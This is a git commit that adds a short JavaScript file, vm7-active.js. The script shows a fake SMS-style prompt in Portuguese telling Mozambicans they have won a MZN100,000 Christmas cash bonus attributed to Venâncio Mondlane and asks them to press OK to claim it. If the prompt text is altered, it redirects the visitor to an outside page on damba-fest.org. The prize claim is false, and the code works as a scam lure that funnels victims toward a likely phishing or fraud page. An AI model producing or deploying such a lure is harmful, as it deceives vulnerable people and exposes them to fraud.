d1e78d9fed37bdcb8f2f67baac4b46eae639f90c
boss-bloq <nsisboy01@gmail.com>
2024-11-30 23:44:19 -0800

    Create vm7-active.js

---
+++ vm7-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIR MZN100.000'
+password=prompt('SMS: Parabéns Você se qualifica para o BÔNUS EM DINHEIRO DE NATAL DE VENÂNCIA MONDLAN MZN100.000 PARA MOÇAMBICANOS. Por favor, pressione OK para retirar o prêmio em dinheiro   ','RETIR MZN100.000');
+if (password != 'RETIR MZN100.000') {
+location.href='https://damba-fest.org/vm7-grant.html';
+}
